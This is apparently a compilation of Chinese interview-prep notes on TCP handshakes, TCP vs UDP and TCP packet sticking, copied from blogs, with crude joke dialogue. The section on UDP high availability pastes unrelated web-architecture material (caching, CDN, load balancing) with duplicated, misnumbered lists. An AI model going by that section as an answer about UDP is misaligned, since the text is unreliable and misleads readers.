
当然也可以更通俗的去理解：
“喂，你听得到吗？”
“我听得到呀，你听得到我吗？”
“我听得到呀，你听得到我吗？”
“我能听到你”
三次握手为什么不用两次，或者四次
原因很简单，因为只有三次才是最合适的，三次通信是最小值，两次通信满足不了要求，而四次通信则显得冗余。比如之前的三次改成两次，四次的结果就变味了。
两次握手：
“喂，你听得到吗？”
“我听得到呀”
“喂，你听得到吗？”
“草，我听得到呀！！！！”
“你TM能不能听到我讲话啊！！喂！”
“……”
四次握手：
“喂，你听得到吗？”
“我听得到呀，你听得到我吗？”
“我能听到你，你能听到我吗？”
“……不想跟傻逼说话”
TCP的三次握手流程
虽然有人说这个是尼玛都看了一千遍的了，但是还是要大致说下。

这里写图片描述

第一次握手：Client将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。

第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。

第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。

TCP三次握手深入解析

关于三次握手的目的，谢希仁的《计算机网络》中这么说“为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误”。在另一部经典的《计算机网络》一书中讲“三次握手”的目的是为了解决“网络中存在延迟的重复分组”的问题。这两种不用的表述其实阐明的是同一个问题。

谢希仁版《计算机网络》中的例子是这样的，“已失效的连接请求报文段”的产生在这样一种情况下：client发出的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达server。本来这是一个早已失效的报文段。但server收到此失效的连接请求报文段后，就误认为是client再次发出的一个新的连接请求。于是就向client发出确认报文段，同意建立连接。假设不采用“三次握手”，那么只要server发出确认，新的连接就建立了。由于现在client并没有发出建立连接的请求，因此不会理睬server的确认，也不会向server发送数据。但server却以为新的运输连接已经建立，并一直等待client发来数据。这样，server的很多资源就白白浪费掉了。采用“三次握手”的办法可以防止上述现象发生。例如刚才那种情况，client不会向server的确认发出确认。server由于收不到确认，就知道client并没有要求建立连接。”

但我之前听过http协议的三次握手，有点懵逼，到底是tcp协议三次握手还是http协议三次握手呢？知乎的答案如下：

http是应用层协议，它的任务是与服务器交换信息。至于怎么连到服务器，怎么保证数据正确，http不管。事实上它总是假设数据是正确地传输的。而tcp的任务是保证连接的可靠，包括防丢、防错。为了做到这些，在初次连接时要进行3次握手，以保证确实连接到了目标机器。而连接上后具体传送什么数据，tcp是不管的。别的应用层协议也能通过tcp进行，那么这种协议在底层也进行3次握手。在某些情况下，http可以不通过tcp实现，那就不需要3次握手。比如，我做了一把遥控咖啡壶，遥控器和壶通过红外直接连接，通过http协议post提交煮咖啡的指令，get获取是否已经煮好。http字符直接调制到红外上，此时http应用层下面直接是物理层，当然不存在3次握手了，连ip地址和mac地址也不存在
```

### TCP、UDP 区别，分别适用场景
```
https://www.cnblogs.com/liangyc/p/11628208.html
区别

面向连接VS无连接
TCP建立一个连接需要3次握手IP数据包，断开连接需要4次握手。另外断开连接时发起方可能进入TIME_WAIT状态长达数分钟（视系统设置，windows一般为120秒），在此状态下连接（端口）无法被释放。
UDP不需要建立连接，可以直接发起。
可靠VS不可靠
TCP利用握手、ACK和重传机制，udp没有。
1，校验和（校验数据是否损坏）；
2，定时器（分组丢失则重传）；
3，序列号（用于检测丢失的分组和重复的分组）；
4，确认应答ACK（接收方告知发送方正确接收分组以及期望的下一个分组）；
5，否定确认（接收方通知发送方未被正确接收的分组）；
6，窗口和流水线（用于增加信道的吞吐量）。（窗口大小：无需等待确认应答而可以继续发送数据的最大值）
有序性
TCP利用seq序列号对包进行排序，udp没有。
面向字节流vs面向报文
面向报文
面向报文的传输方式是应用层交给UDP多长的报文，UDP就照样发送，即一次发送一个报文。因此，应用程序必须选择合适大小的报文。若报文太长，则IP层需要分片。UDP对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。这也就是说，应用层交给UDP多长的报文，UDP就照样发送，即一次发送一个报文。（一个upd的最大报文长度2^16-1-20-8,20是ip报文头，8是udp报文头）
面向字节流
面向字节流的话，虽然应用程序和TCP的交互是一次一个数据块（大小不等），但TCP把应用程序看成是一连串的无结构的字节流。TCP有一个缓冲，当应用程序传送的数据块太长，TCP就可以把它划分短一些再传送。如果应用程序一次只发送一个字节，TCP也可以等待积累有足够多的字节后再构成报文段发送出去。
tcp有流量控制，udp没有
tcp的头部比20bytes，udp8byres
TCP应用场景：
效率要求相对低，但对准确性要求相对高的场景。因为传输中需要对数据确认、重发、排序等操作，相比之下效率没有UDP高。举几个例子：文件传输（准确高要求高、但是速度可以相对慢）、接受邮件、远程登录。

UDP应用场景：
效率要求相对高，对准确性要求相对低的场景。举几个例子：QQ聊天、在线视频、网络语音电话（即时通讯，速度要求高，但是出现偶尔断续不是太大问题，并且此处完全不可以使用重发机制）、广播通信（广播、多播）。
```

### 有什么办法能保证 UDP 高可用性(了解)
```
https://blog.csdn.net/qq_37651267/article/details/93368908
难题与方案
1、亿级流量电商网站的商品详情页系统架构
面临难题：对于每天上亿流量，拥有上亿页面的大型电商网站来说，能够支撑高并发访问，同时能够秒级让最新模板生效的商品详情页系统的架构是如何设计的?
解决方案：异步多级缓存架构+nginx本地化缓存+动态模板渲染的架构
2、redis企业级集群架构
面临难题：如何让redis集群支撑几十万QPS高并发+99.99%高可用+TB级海量数据+企业级数据备份与恢复?
解决方案：redis的企业级备份恢复方案+复制架构+读写分离+哨兵架构+redis cluster集群部署
3、多级缓存架构设计
面临难题：如何将缓存架构设计的能够支撑高性能以及高并发到极致?同时还要给缓存架构最后的一个安全保护层?
解决方案：nginx抗热点数据+redis抗大规模离线请求+ehcache抗redis崩溃的三级缓存架构
4、数据库+缓存双写一致性解决方案
面临难题：高并发场景下，如何解决数据库与缓存双写的时候数据不一致的情况?
解决方案：异步队列串行化的数据库+缓存双写一致性解决方案
5、缓存维度化拆分解决方案
面临难题：如何解决大value缓存的全量更新效率低下问题?
解决方案：商品缓存数据的维度化拆分解决方案
6、缓存命中率提升解决方案
面临难题：如何将缓存命中率提升到极致?
解决方案：双层nginx部署架构+lua脚本实现一致性hash流量分发策略
7、缓存并发重建冲突解决方案
面临难题：如何解决高并发场景下，缓存重建时的分布式并发重建的冲突问题?
解决方案：基于zookeeper分布式锁的缓存并发重建冲突解决方案
8、缓存预热解决方案
面临难题：如何解决高并发场景下，缓存冷启动导致MySQL负载过高，甚至瞬间被打死的问题?
解决方案：基于storm实时统计热数据的分布式快速缓存预热解决方案
9、热点缓存自动降级方案
面临难题：如何解决热点缓存导致单机器负载瞬间超高?
解决方案：基于storm的实时热点发现+毫秒级的实时热点缓存负载均衡降级
10、高可用分布式系统架构设计
面临难题：如何解决分布式系统中的服务高可用问题?避免多层服务依赖因为少量故障导致系统崩溃?
解决方案：基于hystrix的高可用缓存服务，资源隔离+限流+降级+熔断+超时控制
11、复杂的高可用分布式系统架构设计
面临难题：如何针对复杂的分布式系统将其中的服务设计为高可用架构?
解决方案：基于hystrix的容错+多级降级+手动降级+生产环境参数优化经验+可视化运维与监控
12、缓存雪崩解决方案
面临难题：如何解决恐怖的缓存雪崩问题?避免给公司带来巨大的经济损失?
解决方案：全网独家的事前+事中+事后三层次完美缓存雪崩解决方案
13、缓存穿透解决方案
面临难题：如何解决高并发场景下的缓存穿透问题?避免给MySQL带来过大的压力?
解决方案：缓存穿透解决方案
14、缓存失效解决方案
面临难题：如何解决高并发场景下的缓存失效问题?避免给redis集群带来过大的压力?
解决方案：基于随机过期时间的缓存失效解决方案

具体措施
1、HTML静态化
其实大家都知道，效率最高、消耗最小的就是纯静态化的html页面，所以我们尽可能使我们的网站上的页面采用静态页面来实现，这个最简单的方法其实也是最有效的方法。但是对于大量内容并且频繁更新的网站，我们无法全部手动去挨个实现，于是出现了我们常见的信息发布系统CMS，像我们常访问的各个门户站点的新闻频道，甚至他们的其他频道，都是通过信息发布系统来管理和实现的，信息发布系统可以实现最简单的信息录入自动生成静态页面，还能具备频道管理、权限管理、自动抓取等功能，对于一个大型网站来说，拥有一套高效、可管理的CMS是必不可少的。

除了门户和信息发布类型的网站，对于交互性要求很高的社区类型网站来说，尽可能的静态化也是提高性能的必要手段，将社区内的帖子、文章进行实时的静态化、有更新的时候再重新静态化也是大量使用的策略，像Mop的大杂烩就是使用了这样的策略，网易社区等也是如此。

同时，html静态化也是某些缓存策略使用的手段，对于系统中频繁使用数据库查询但是内容更新很小的应用，可以考虑使用html静态化来实现。比如论坛中论坛的公用设置信息，这些信息目前的主流论坛都可以进行后台管理并且存储在数据库中，这些信息其实大量被前台程序调用，但是更新频率很小，可以考虑将这部分内容进行后台更新的时候进行静态化，这样避免了大量的数据库访问请求。

2、图片服务器分离
大家知道，对于Web服务器来说，不管是Apache、IIS还是其他容器，图片是最消耗资源的，于是我们有必要将图片与页面进行分离，这是基本上大型网站都会采用的策略，他们都有独立的、甚至很多台的图片服务器。这样的架构可以降低提供页面访问请求的服务器系统压力，并且可以保证系统不会因为图片问题而崩溃。

在应用服务器和图片服务器上，可以进行不同的配置优化，比如apache在配置ContentType的时候可以尽量少支持、尽可能少的LoadModule，保证更高的系统消耗和执行效率。

3、数据库集群、库表散列
大型网站都有复杂的应用，这些应用必须使用数据库，那么在面对大量访问的时候，数据库的瓶颈很快就能显现出来，这时一台数据库将很快无法满足应用，于是我们需要使用数据库集群或者库表散列。

在数据库集群方面，很多数据库都有自己的解决方案，Oracle、Sybase等都有很好的方案，常用的MySQL提供的Master/Slave也是类似的方案，您使用了什么样的DB，就参考相应的解决方案来实施即可。

上面提到的数据库集群由于在架构、成本、扩张性方面都会受到所采用DB类型的限制，于是我们需要从应用程序的角度来考虑改善系统架构，库表散列是常用并且最有效的解决方案。

我们在应用程序中安装业务和应用或者功能模块将数据库进行分离，不同的模块对应不同的数据库或者表，再按照一定的策略对某个页面或者功能进行更小的数据库散列，比如用户表，按照用户ID进行表散列，这样就能够低成本的提升系统的性能并且有很好的扩展性。

sohu的论坛就是采用了这样的架构，将论坛的用户、设置、帖子等信息进行数据库分离，然后对帖子、用户按照板块和ID进行散列数据库和表，最终可以在配置文件中进行简单的配置便能让系统随时增加一台低成本的数据库进来补充系统性能。

4、缓存
缓存一词搞技术的都接触过，很多地方用到缓存。网站架构和网站开发中的缓存也是非常重要。这里先讲述最基本的两种缓存。高级和分布式的缓存在后面讲述。

架构方面的缓存，对Apache比较熟悉的人都能知道Apache提供了自己的缓存模块，也可以使用外加的Squid模块进行缓存，这两种方式均可以有效的提高Apache的访问响应能力。

网站程序开发方面的缓存，Linux上提供的Memory Cache是常用的缓存接口，可以在web开发中使用，比如用Java开发的时候就可以调用MemoryCache对一些数据进行缓存和通讯共享，一些大型社区使用了这样的架构。另外，在使用web语言开发的时候，各种语言基本都有自己的缓存模块和方法，PHP有Pear的Cache模块，Java就更多了，.net不是很熟悉，相信也肯定有。

5、镜像
镜像是大型网站常采用的提高性能和数据安全性的方式，镜像的技术可以解决不同网络接入商和地域带来的用户访问速度差异，比如ChinaNet和EduNet之间的差异就促使了很多网站在教育网内搭建镜像站点，数据进行定时更新或者实时更新。在镜像的细节技术方面，这里不阐述太深，有很多专业的现成的解决架构和产品可选。也有廉价的通过软件实现的思路，比如Linux上的rsync等工具。

6、负载均衡
负载均衡将是大型网站解决高负荷访问和大量并发请求采用的高端解决办法。

负载均衡技术发展了多年，有很多专业的服务提供商和产品可以选择，我个人接触过一些解决方法，其中有两个架构可以给大家做参考。

（1）、硬件四层交换

第四层交换使用第三层和第四层信息包的报头信息，根据应用区间识别业务流，将整个区间段的业务流分配到合适的应用服务器进行处理。

第四层交换功能就像是虚IP，指向物理服务器。它传输的业务服从的协议多种多样，有HTTP、FTP、NFS、Telnet或其他协议。这些业务在物理服务器基础上，需要复杂的载量平衡算法。在IP世界，业务类型由终端TCP或UDP端口地址来决定，在第四层交换中的应用区间则由源端和终端IP地址、TCP和UDP端口共同决定。

在硬件四层交换产品领域，有一些知名的产品可以选择，比如Alteon、F5等，这些产品很昂贵，但是物有所值，能够提供非常优秀的性能和很灵活的管理能力。“Yahoo中国”当初接近2000台服务器，只使用了三、四台Alteon就搞定了。

(2)、软件四层交换

大家知道了硬件四层交换机的原理后，基于OSI模型来实现的软件四层交换也就应运而生，这样的解决方案实现的原理一致，不过性能稍差。但是满足一定量的压力还是游刃有余的，有人说软件实现方式其实更灵活，处理能力完全看你配置的熟悉能力。

软件四层交换我们可以使用Linux上常用的LVS来解决，LVS就是Linux Virtual Server，他提供了基于心跳线heartbeat的实时灾难应对解决方案，提高系统的强壮性，同时可供了灵活的虚拟VIP配置和管理功能，可以同时满足多种应用需求，这对于分布式的系统来说必不可少。

一个典型的使用负载均衡的策略就是，在软件或者硬件四层交换的基础上搭建squid集群，这种思路在很多大型网站包括搜索引擎上被采用，这样的架构低成本、高性能还有很强的扩张性，随时往架构里面增减节点都非常容易。

对于大型网站来说，前面提到的每个方法可能都会被同时使用到，这里介绍得比较浅显，具体实现过程中很多细节还需要大家慢慢熟悉和体会。有时一个很小的squid参数或者apache参数设置，对于系统性能的影响就会很大。

7、最新：CDN加速技术
什么是CDN？

CDN的全称是内容分发网络。其目的是通过在现有的Internet中增加一层新的网络架构，将网站的内容发布到最接近用户的网络“边缘”，使用户可以就近取得所需的内容，提高用户访问网站的响应速度。

CDN有别于镜像，因为它比镜像更智能，或者可以做这样一个比喻：CDN=更智能的镜像+缓存+流量导流。因而，CDN可以明显提高Internet网络中信息流动的效率。从技术上全面解决由于网络带宽小、用户访问量大、网点分布不均等问题，提高用户访问网站的响应速度。

CDN的类型特点

CDN的实现分为三类：镜像、高速缓存、专线。

镜像站点（Mirror Site），是最常见的，它让内容直接发布，适用于静态和准动态的数据同步。但是购买和维护新服务器的费用较高，还必须在各个地区设置镜像服务器，配备专业技术人员进行管理与维护。对于大型网站来说，更新所用的带宽成本也大大提高了。

高速缓存，成本较低，适用于静态内容。Internet的统计表明，超过80%的用户经常访问的是20%的网站的内容，在这个规律下，缓存服务器可以处理大部分客户的静态请求，而原始的服务器只需处理约20%左右的非缓存请求和动态请求，于是大大加快了客户请求的响应时间，并降低了原始服务器的负载。

CDN服务一般会在全国范围内的关键节点上放置缓存服务器。

专线，让用户直接访问数据源，可以实现数据的动态同步。

CDN的实例

举个例子来说，当某用户访问网站时，网站会利用全球负载均衡技术，将用户的访问指向到距离用户最近的正常工作的缓存服务器上，直接响应用户的请求。

当用户访问已经使用了CDN服务的网站时，其解析过程与传统解析方式的最大区别就在于网站的授权域名服务器不是以传统的轮询方式来响应本地DNS的解析请求，而是充分考虑用户发起请求的地点和当时网络的情况，来决定把用户的请求定向到离用户最近同时负载相对较轻的节点缓存服务器上。

通过用户定位算法和服务器健康检测算法综合后的数据，可以将用户的请求就近定向到分布在网络“边缘”的缓存服务器上，保证用户的访问能得到更及时可靠的响应。

由于大量的用户访问都由分布在网络边缘的CDN节点缓存服务器直接响应了，这就不仅提高了用户的访问质量，同时有效地降低了源服务器的负载压力。

附：某CDN服务商的服务说明

采用GCDN加速方式

采用了GCDN加速方式以后，系统会在浏览用户和您的服务器之间增加一台GCDN服务器。浏览用户访问您的服务器时，一般静态数据，如图片、多媒体资料等数据将直接从GCDN服务器读取，使得从主服务器上读取静态数据的交换量大大减少。

为VIP型虚拟主机而特加的VPN高速压缩通道，使用高速压缩的电信<>网通、电信<>国际（HK）、网通<==>国际（HK）等跨网专线通道，智能多线，自动获取最快路径，极速的动态实时并发响应速度，实现了网站的动态脚本实时同步，对动态网站有一个更加明显的加速效果。

每个网络运营商（电信、网通、铁通、教育网）均有您服务器的GCDN服务器，无论浏览用户是来自何处，GCDN都能让您的服务器展现最快的速度！另外，我们将对您的数据进行实时备份，让您的数据更安全！

8、降级
降级的最终目的是保证核心服务可用，即使是有损的。而且有些服务是无法降级的（如加入购物车、结算）。

降级预案

在进行降级之前要对系统进行梳理，看看系统是不是可以丢卒保帅；从而梳理出哪些必须誓死保护，哪些可降级；比如可以参考日志级别设置预案：

一般：比如有些服务偶尔因为网络抖动或者服务正在上线而超时，可以自动降级；

警告：有些服务在一段时间内成功率有波动（如在95~100%之间），可以自动降级或人工降级，并发送告警；

错误：比如可用率低于90%,或者数据库连接池被打爆了，或者访问量突然猛增到系统能承受的最大阀值，此时可以根据情况自动降级或者人工降级；

严重错误：比如因为特殊原因数据错误了，此时需要紧急人工降级。

降级按照是否自动化可分为：自动开关降级和人工开关降级。

降级按照功能可分为：读服务降级、写服务降级。

降级按照处于的系统层次可分为：多级降级。

降级的功能点主要从服务端链路考虑，即根据用户访问的服务调用链路来梳理哪里需要降级：

页面降级、页面片段降级、页面异步请求降级、服务功能降级、读降级、写降级

自动开关降级：超时降级、统计失败次数降级、故障降级、限流降级

人工开关降级：读服务降级、写服务降级

9、分层
分层是企业应用系统中最常见的一种架构模式，将系统在横向维度上切分成几个部分，每个部分负责一部分相对简单并比较单一的职责，然后通过上层对下层的依赖和调度组成一个完整的系统。

在网站的分层架构中，常见的为3层，即应用层、服务层、数据层。应用层具体负责业务和视图的展示;服务层为应用层提供服务支持;数据库提供数据存储访问服务，如数据库、缓存、文件、搜索引擎等。

分层架构是逻辑上的，在物理部署上，三层架构可以部署在同一个物理机器上，但是随着网站业务的发展，必然需要对已经分层的模块分离部署，即三层结构分别部署在不同的服务器上，是网站拥有更多的计算资源以应对越来越多的用户访问。

所以虽然分层架构模式最初的目的是规划软件清晰的逻辑结构以便于开发维护，但在网站的发展过程中，分层结构对网站支持高并发向分布式方向的发展至关重要。

10、限流
在开发高并发系统时有三把利器用来保护系统：缓存、降级和限流。缓存的目的是提升系统访问速度和增大系统能处理的容量，可谓是抗高并发流量的银弹；而降级是当服务出问题或者影响到核心流程的性能则需要暂时屏蔽掉，待高峰或者问题解决后再打开；而有些场景并不能用缓存和降级来解决，比如稀缺资源（秒杀、抢购）、写服务（如评论、下单）、频繁的复杂查询（评论的最后几页），因此需有一种手段来限制这些场景的并发/请求量，即限流。

限流的目的是通过对并发访问/请求进行限速或者一个时间窗口内的的请求进行限速来保护系统，一旦达到限制速率则可以拒绝服务（定向到错误页或告知资源没有了）、排队或等待（比如秒杀、评论、下单）、降级（返回兜底数据或默认数据，如商品详情页库存默认有货）。

一般开发高并发系统常见的限流有：限制总并发数（比如数据库连接池、线程池）、限制瞬时并发数（如nginx的limit_conn模块，用来限制瞬时并发连接数）、限制时间窗口内的平均速率（如Guava的RateLimiter、nginx的limit_req模块，限制每秒的平均速率）；其他还有如限制远程接口调用速率、限制MQ的消费速率。另外还可以根据网络连接数、网络流量、CPU或内存负载等来限流。
1
11、隔离
线程隔离：

线程隔离主要是指线程池隔离，在实际使用时，我们会把请求分类，然后交给不同的线程池处理。当一种业务的请求处理发生问题时，不会将故障扩散到其他线程池，从而保证其他服务可用。

进程隔离

由于传统的系统所有功能都集中在一个系统中，为了避免系统其中一个模块功能出现问题导致整个系统无法使用的情况发生，将其该系统拆分成多子系统实现物理隔离，故通过进程隔离使得某一个子系统出现问题时不影响到其他子系统。

集群隔离

随着调用方的增多，当秒杀（并发量特别大功能）类似的服务被刷新会影响到其他服务的稳定性时，应该考虑为秒杀（并发量特别大功能）类似的服务提供单独的服务集群，即分服务分组，这样当某一个分组出现问题时，不会影响到其他分组，从而实现了故障隔离愿景。

机房隔离

随着对系统可用性的要求，会进行多机房部署，每一个机房的服务都有自己的服务分组，本机房的服务应该只调用本机房的服务，不进行跨机房调用。其中，一个机房服务发生问题时，可以通过DNS/负载均衡将请求全部切到另一个机房，或者考虑服务能自动重试其他机房的服务，从而提升系统可用性。

读写隔离

为了提高数据访问，一般采用redis主从模式将读和写进群分离，在正常情况下，当主redis集群出现问题时，从redis集群还是可以用的，从而不影响用户的访问。

动静隔离

例如当用户访问如结算页时，如果JS/CSS等静态资源也在结算页系统中时，很可能因为访问量太大导致带宽被打满导致出现不可用。

为了不影响结算等用户操作的功能，将其JS/CSS等静态资源静态化与用户操作功能分开部署。

资源隔离

最常见的资源如磁盘、CPU、网络；对于宝贵的资源都会存在竞争问题。

我们可以使用JIMDB数据同步时要dump数据，SSD盘容量用了50%以上，dump到同一块磁盘时遇到了容量不足的问题，我们通过单独挂一块SAS盘来专门同步数据。还有如使用Docker容器时，有的容器写磁盘非常频繁，因此要考虑为不同的容器挂载不同的磁盘。

12、超时重试
在实际开发过程中，我们见过太多故障时因为没有设置超时或者设置得不对而造成的，而这些故障都是因为没有意识到超时设置的重要性而造成的。如果应用不设置超时，则可能会导致请求响应慢，慢请求积累导致连锁反应，甚至造成应用雪塌。而有些中间件或者框架在超时后进行重试（例如dubbo默认重试两次），读服务天然适合重试，但写服务大多不能重试（如写订单、支付等），重试次数太多会导致多倍请求流量。

例如模拟了Ddos攻击（分布式拒绝服务（DDoS:Distributed Denial of Service）攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS,通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。），后果可能是灾难，因此，务必设置合理的重试机制，并且应该和熔断、快速失败机制配合。所以在进行代码Review时，一定记得Review超时与重试机制。

13、自动化
具体有自动化发布过程，自动化代码管理、自动化测试、自动化安全检测、自动化部署、自动化监控、自动化报警、自动化失效转移、自动化失效恢复等。

14、冗余
网站需要7×24小时连续运行，那么就得有相应的冗余机制，以防某台机器宕掉时无法访问，而冗余则可以通过部署至少两台服务器构成一个集群实现服务高可用。数据库除了定期备份还需要实现冷热备份。甚至可以在全球范围内部署灾备数据中心。

15、安全
网站在安全架构方面有许多模式：通过密码和手机校验码进行身份认证;登录、交易需要对网络通信进行加密;为了防止机器人程序滥用资源，需要使用验证码进行识别;对常见的XSS攻击、SQL注入需要编码转换;垃圾信息需要过滤等。

16、集群
对于用户访问集中的模块需要将独立部署的服务器集群化，即多台服务器部署相同的应用构成一个集群，通过负载均衡设备共同对外提供服务。

服务器集群能够为相同的服务提供更多的并发支持，因此当有更多的用户访问时，只需要向集群中加入新的机器即可;另外可以实现当其中的某台服务器发生故障时，可以通过负载均衡的失效转移机制将请求转移至集群中其他的服务器上，因此可以提高系统的可用性。

17、分布式
对于大型网站，分层和分隔的一个主要目的是为了切分后的模块便于分布式部署，即将不同模块部署在不同的服务器上，通过远程调用协同工作。分布式意味着可以使用更多的计算机完成同样的工作，计算机越多，CPU、内存、存储资源就越多，能过处理的并发访问和数据量就越大，进而能够为更多的用户提供服务。

在网站应用中，常用的分布式方案有一下几种.

分布式应用和服务：将分层和分隔后的应用和服务模块分布式部署，可以改善网站性能和并发性、加快开发和发布速度、减少数据库连接资源消耗。

分布式静态资源：网站的静态资源如JS、CSS、Logo图片等资源对立分布式部署，并采用独立的域名，即人们常说的动静分离。静态资源分布式部署可以减轻应用服务器的负载压力;通过使用独立域名加快浏览器并发加载的速度。

分布式数据和存储：大型网站需要处理以P为单位的海量数据，单台计算机无法提供如此大的存储空间，这些数据库需要分布式存储。

分布式计算：目前网站普遍使用Hadoop和MapReduce分布式计算框架进行此类批处理计算，其特点是移动计算而不是移动数据，将计算程序分发到数据所在的位置以加速计算和分布式计算。

18、压力测试
线下压力测试

通过如Jmeter,Apac,he ab 压力测试系统的某一个接口等（如登录、查询订单）或者某一个组件（例如数据库连接池），然后进行调优（如调优JVM参数，优化代码等），实现单个接口或者组件的性能最优。

线上压力测试

线上压力测试份方式非常多，按读分为读压、写压测和混合压测，按照数据仿真度分为仿真压力测试和引流压力测试，按照给用户提供服务分为隔离集群压力测试和线上集群压力测试。

19、系统优化和容灾
拿到全面的压力测试报告后，接下来就是分析报告，然后进行一些有针对性的优化，如硬件升级、系统扩容、参数调优、代码优化（代码同步改异步）、架构优化（如加缓存、读写分离、历史数据归档）等。在扩容时也需要考虑容灾，比如分组部署、跨机房部署。容灾是通过部署多组（单机房或多机房）相同系统，当其中一组出现问题时，可以切换到另一个分组，保证系统可用

20、应急预案

在系统压力测试之后发现一些系统瓶颈，在系统优化之后会提升系统吞吐量并降低响应时间，容灾之后的系统可用性得以保障，但还是会存在一些风险，如网络抖动、某台机器负载过高、某个服务变慢、数据库Load值过高，为了防止因为这些问题而出现系统雪崩，需要针对这些情况制定应急预案，从而在出现突发情况时，有响应的措施来解决掉这些问题。

应急预案可按照如下几步进行：首先进行系统分级，然后进行全链路分析、配置监控，最后制定应急预案。

九种技术架构
1、分层
分层是企业应用系统中最常见的一种架构模式，将系统在横向维度上切分成几个部分，每个部分负责一部分相对简单并比较单一的职责，然后通过上层对下层的依赖和调度组成一个完整的系统。
在网站的分层架构中，常见的为3层，即应用层、服务层、数据层。
应用层，具体负责业务和视图的展示；
服务层，为应用层提供服务支持；
数据层，提供数据存储访问服务，如数据库、缓存、文件、搜索引擎等。
分层架构是逻辑上的，在物理部署上，三层架构可以部署在同一个物理机器上，但是随着网站业务的发展，必然需要对已经分层的模块分离部署，即三层结构分别部署在不同的服务器上，使网站拥有更多的计算资源，以应对越来越多的用户访问。
所以，虽然分层架构模式最初的目的，是规划软件清晰的逻辑结构，以便于开发维护。但在网站的发展过程中，分层结构对网站支持高并发，向分布式方向的发展至关重要。
在这里插入图片描述
2、冗余
网站需要7×24小时连续运行，那么就得有相应的冗余机制，以防某台机器宕掉时无法访问，而冗余则可以通过部署至少两台服务器构成一个集群实现服务高可用。数据库除了定期备份还需要实现冷热备份。甚至可以在全球范围内部署灾备数据中心。
3、分隔
如果说分层是将软件在横向方面进行切分，那么分隔就是在纵向方面对软件进行切分。
网站越大，功能越复杂，服务和数据处理的种类也越多，将这些不同的功能和服务分隔开来，包装成高内聚低耦合的模块单元，不仅有助于软件的开发维护也便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展能力。
大型网站分隔的粒度可能会很小。比如在应用层，将不同业务进行分隔，例如将购物、论坛、搜索、广告分隔成不同的应用，有对立的团队负责，部署在不同的服务器上。
4、异步
使用异步，业务之间的消息传递不是同步调用，而是将一个业务操作分成多个阶段，每个阶段之间通过共享数据的方法异步执行进行协作。
具体实现则在单一服务器内部可用通过多线程共享内存的方式处理；在分布式系统中可用通过分布式消息队列来实现异步。
异步架构的典型就是生产者消费者方式，两者不存在直接调用。
5、分布式
对于大型网站，分层和分隔的一个主要目的是为了切分后的模块便于分布式部署，即将不同模块部署在不同的服务器上，通过远程调用协同工作。分布式意味着可以使用更多的计算机完同样的工作，计算机越多，CPU、内存、存储资源就越多，能过处理的并发访问和数据量就越大，进而能够为更多的用户提供服务。
在网站应用中，常用的分布式方案有一下几种.
分布式应用和服务：将分层和分隔后的应用和服务模块分布式部署，可以改善网站性能和并发性、加快开发和发布速度、减少数据库连接资源消耗。
分布式静态资源：网站的静态资源如JS、CSS、Logo图片等资源对立分布式部署，并采用独立的域名，即人们常说的动静分离。静态资源分布式部署可以减轻应用服务器的负载压力；通过使用独立域名加快浏览器并发加载的速度。
分布式数据和存储：大型网站需要处理以P为单位的海量数据，单台计算机无法提供如此大的存储空间，这些数据库需要分布式存储。
分布式计算：目前网站普遍使用Hadoop和MapReduce分布式计算框架进行此类批处理计算，其特点是移动计算而不是移动数据，将计算程序分发到数据所在的位置以加速计算和分布式计算。
在这里插入图片描述
6、安全
网站在安全架构方面有许多模式：通过密码和手机校验码进行身份认证；登录、交易需要对网络通信进行加密；为了防止机器人程序滥用资源，需要使用验证码进行识别；对常见的XSS攻击、SQL注入需要编码转换；垃圾信息需要过滤等。
8、自动化
具体有自动化发布过程，自动化代码管理、自动化测试、自动化安全检测、自动化部署、自动化监控、自动化报警、自动化失效转移、自动化失效恢复等。
8、集群
对于用户访问集中的模块需要将独立部署的服务器集群化，即多台服务器部署相同的应用构成一个集群，通过负载均衡设备共同对外提供服务。
服务器集群能够为相同的服务提供更多的并发支持，因此当有更多的用户访问时，只需要向集群中加入新的机器即可；另外可以实现当其中的某台服务器发生故障时，可以通过负载均衡的失效转移机制将请求转移至集群中其他的服务器上，因此可以提高系统的可用性。
在这里插入图片描述
9、缓存
缓存目的就是减轻服务器的计算，使数据直接返回给用户。在现在的软件设计中，缓存已经无处不在。具体实现有CDN、反向代理、本地缓存、分布式缓存等。
使用缓存有两个条件：访问数据热点不均衡，即某些频繁访问的数据需要放在缓存中；数据在某个时间段内有效，不过很快过期，否在会因为数据过期而脏读，影响数据的正确性。


```

### TCP 粘包如何解决？
```
https://blog.csdn.net/feng020a/article/details/60587726
随着智能硬件越来越流行，很多后端开发人员都有可能接触到socket编程。而很多情况下，服务器与端上需要保证数据的有序，稳定到达，自然而然就会选择基于tcp/ip协议的socekt开发。开发过程中，经常会遇到tcp粘包，拆包的问题，本文将从产生原因，和解决方案以及workerman是如何处理粘包拆包问题的，这几个层面来说明这个问题。

什么是粘包拆包

对于什么是粘包、拆包问题，我想先举两个简单的应用场景：

客户端和服务器建立一个连接，客户端发送一条消息，客户端关闭与服务端的连接。

客户端和服务器简历一个连接，客户端连续发送两条消息，客户端关闭与服务端的连接。

对于第一种情况，服务端的处理流程可以是这样的：当客户端与服务端的连接建立成功之后，服务端不断读取客户端发送过来的数据，当客户端与服务端连接断开之后，服务端知道已经读完了一条消息，然后进行解码和后续处理...。对于第二种情况，如果按照上面相同的处理逻辑来处理，那就有问题了，我们来看看第二种情况下客户端发送的两条消息递交到服务端有可能出现的情况：

第一种情况：

